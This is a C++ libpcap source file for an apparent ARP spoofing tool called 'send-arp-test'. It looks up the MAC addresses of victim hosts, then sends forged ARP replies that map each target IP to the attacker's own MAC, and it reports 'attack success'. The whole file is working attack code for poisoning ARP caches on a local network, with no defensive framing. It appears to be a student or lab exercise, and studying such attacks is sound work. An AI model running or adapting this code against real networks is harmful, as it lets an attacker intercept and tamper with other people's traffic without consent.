#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "util.h"
#include <iostream>
#include <cstdio>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;

	EthArpPacket() {
		eth_.type_ = htons(EthHdr::Arp);
		arp_.hrd_ = htons(ArpHdr::ETHER);
		arp_.pro_ = htons(EthHdr::Ip4);
		arp_.op_ = htons(ArpHdr::Request);
		arp_.hln_ = Mac::SIZE;
		arp_.pln_ = Ip::SIZE;
	}

	EthArpPacket(uint8_t value) {
		memset(&eth_, value, sizeof(EthHdr));
		memset(&arp_, value, sizeof(ArpHdr));
	}

	void set_eth_mac(const char *smac, const char *dmac) {
		eth_.dmac_ = Mac(dmac);
		eth_.smac_ = Mac(smac);
	}
	void set_arp_mac(const char *smac, const char *dmac) {
		arp_.smac_ = Mac(smac);
		arp_.tmac_ = Mac(dmac);
	}
	void set_arp_ip(const char *sip, const char *tip) {
		arp_.sip_ = htonl(Ip(sip));
		arp_.tip_ = htonl(Ip(tip));
	}

	bool isNULL() {
		return (eth_.isNull() || arp_.isNull());
	}
};
struct AttackArpPacket final {
	std::string myIp;
	std::string myMac;
	std::string senderIp;
	std::string senderMac;
	std::string targetIp;
	std::string targetMac;
	EthArpPacket packet;

	AttackArpPacket(char *interface, char *sip, char *tip) {
		myIp = get_my_ip(interface);
		myMac = get_my_mac(interface);
		senderIp = std::string(sip);
		targetIp = std::string(tip);
	}

	void set_getMac_packet(const char *who) {
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.set_eth_mac(myMac.c_str(), "ff:ff:ff:ff:ff:ff");
		packet.set_arp_ip(myIp.c_str(), who);
		packet.set_arp_mac(myMac.c_str(), "00:00:00:00:00:00");
	}

	void set_attack_packet() {
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.set_eth_mac(myMac.c_str(), senderMac.c_str());
		packet.set_arp_mac(myMac.c_str(), senderMac.c_str());
		packet.set_arp_ip(targetIp.c_str(), senderIp.c_str());
	}
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.0.10 192.168.0.1 192.168.0.11 192.168.0.3\n");
}

EthArpPacket send_and_wait_for_arp(pcap_t *handle, EthArpPacket packet_eth, size_t size) {
	int res; 
	res = pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet_eth), size);
	EthArpPacket receive;
	struct pcap_pkthdr* header;
	const u_char* packet;
	int i;

	if (res != 0)
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	
	for (i = 0; i < 8; i++) {
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return EthArpPacket(0);
		}
		memcpy(reinterpret_cast<void *>(&receive), packet, sizeof(EthArpPacket));
		if (receive.eth_.type() == EthHdr::Arp && \
			receive.eth_.dmac_ == packet_eth.eth_.smac_) break;
	}
	if (i == 8) return EthArpPacket(0);
	return receive;
}

int main(int argc, char* argv[]) {
	EthArpPacket receive;
	int do_count;

	if (argc % 2) {
		usage();
		return -1;
	}
	do_count = int((argc - 1) / 2);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	for (int i = 0; i < do_count; i++) {
		AttackArpPacket attack(argv[1], argv[(i+1)*2], argv[(i+1)*2+1]);

		attack.set_getMac_packet(argv[(i+1)*2]);
		receive = send_and_wait_for_arp(handle, attack.packet, sizeof(EthArpPacket));
		if (receive.isNULL()) {
			fprintf(stderr, "[%d] * request failed! skip this step. *", i);
			continue ;
		}
		attack.senderMac = std::string(receive.arp_.smac_);
		printf("[%d] sender mac : ", 1+i);
		std::cout << attack.senderMac << std::endl;

		attack.set_getMac_packet(argv[(i+1)*2+1]);
		receive = send_and_wait_for_arp(handle, attack.packet, sizeof(EthArpPacket));
		if (receive.isNULL()) {
			fprintf(stderr, "[%d] * request failed! skip this step. *", i+1);
			continue ;
		}
		attack.targetMac = std::string(receive.arp_.smac_);
		printf("[%d] target mac : ", i+1);
		std::cout << attack.targetMac << std::endl;

		attack.set_attack_packet();
		int res = pcap_sendpacket(handle, reinterpret_cast<u_char *>(&attack.packet), sizeof(EthArpPacket));
		if (res != 0)
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		else printf("[%d] attack success.\n", i+1);
	}

	pcap_close(handle);
}
